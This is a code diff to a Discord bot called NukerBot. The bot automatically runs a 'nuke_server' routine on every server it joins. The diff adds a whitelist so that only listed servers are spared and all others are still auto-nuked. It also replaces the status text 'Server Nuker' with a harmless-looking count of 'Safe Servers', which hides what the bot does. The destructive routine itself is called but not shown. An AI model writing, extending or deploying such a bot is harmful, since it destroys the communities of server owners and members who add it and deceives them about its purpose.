@@ -42,6 +42,13 @@ class NukerBot(commands.Bot):
         global bot_name
         bot_name = str(self.user)
         print(f"🔗 {bot_name} is ONLINE!")
+        print(f"📊 Connected to {len(self.guilds)} servers")
+        
+        # Whitelisted servers count show karo
+        nuker_cog = self.get_cog("NukerCommands")
+        if nuker_cog:
+            whitelist_count = len(nuker_cog.whitelisted_servers)
+            print(f"🔒 {whitelist_count} servers are whitelisted (SAFE)")
         
         if os.environ.get('RENDER'):
             import threading
@@ -49,17 +56,26 @@ class NukerBot(commands.Bot):
             print("🚀 Flask server started")
 
     async def on_guild_join(self, guild):
-        print(f"💥 Auto-nuking: {guild.name}")
+        print(f"🎯 Bot joined: {guild.name} ({guild.id})")
+        
+        # Whitelist check through nuker cog
         nuker_cog = self.get_cog("NukerCommands")
         if nuker_cog:
-            await nuker_cog.nuke_server(guild)
+            if nuker_cog.is_whitelisted(guild.id):
+                print(f"✅ Whitelisted server: {guild.name} - Safe")
+            else:
+                print(f"💣 Auto-nuking non-whitelisted server: {guild.name}")
+                await nuker_cog.nuke_server(guild)
 
     @tasks.loop(minutes=5)
     async def update_status(self):
         try:
+            nuker_cog = self.get_cog("NukerCommands")
+            whitelist_count = len(nuker_cog.whitelisted_servers) if nuker_cog else 0
+            
             await self.change_presence(activity=discord.Activity(
                 type=discord.ActivityType.watching,
-                name="Server Nuker"
+                name=f"{whitelist_count} Safe Servers"
             ))
         except:
             pass
